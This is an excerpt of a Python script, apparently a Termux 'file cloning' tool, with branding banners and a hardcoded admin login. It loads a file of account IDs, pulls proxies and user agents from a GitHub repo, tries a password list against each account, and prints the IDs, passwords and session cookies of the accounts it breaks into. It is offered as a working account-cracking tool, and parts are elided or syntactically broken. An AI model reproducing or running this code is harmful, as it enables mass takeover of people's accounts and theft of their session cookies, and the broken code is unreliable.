#MAKED-BY-DJ
#GITHUB-jahidulbd19990
#ACTIVE FILE CLONING
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
#DEC-LOVE-YOU-MOM-DON'T-BYPASS-MY-COMMAND
# =[â€¢]=[SCRIPT]=[ADMIN]=[DJ]=[â€¢]=
#------------------[ Install-1 ]-------------------#
import os 
#-----------------[ dJ-king]-------------------# 
...
princp=[]
try:
	prox= requests.get('https://github.com/jahidulbd19990/Api/blob/main/prox.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/jahidulbd19990/Ua.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'DJ' and password == 'MOYE':
...
\033[0;92m â€¢ CEO DJ  FIRE (ðŸ¥°)
\033[0;92m â€¢ FILE CLONING ACTIVE MOYE (ðŸ”¥)
\033[0;92m â€¢ VERSION CODE [ 5.1 ] MOYE(ðŸ˜»)
  \033[0;92mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \033[1;31m""")
def login():
	banner()
	j('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	j('\033[0;97m===============================================')
	= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if DJ in ['m']:
		public()
	elif DJ in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+881323')
	elif DJ in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/bd.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Milon-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢Milon-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
				...
				#DJ-King
				print(f'\r\033[0;92m[DJ-âž¼-OKðŸ˜»] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
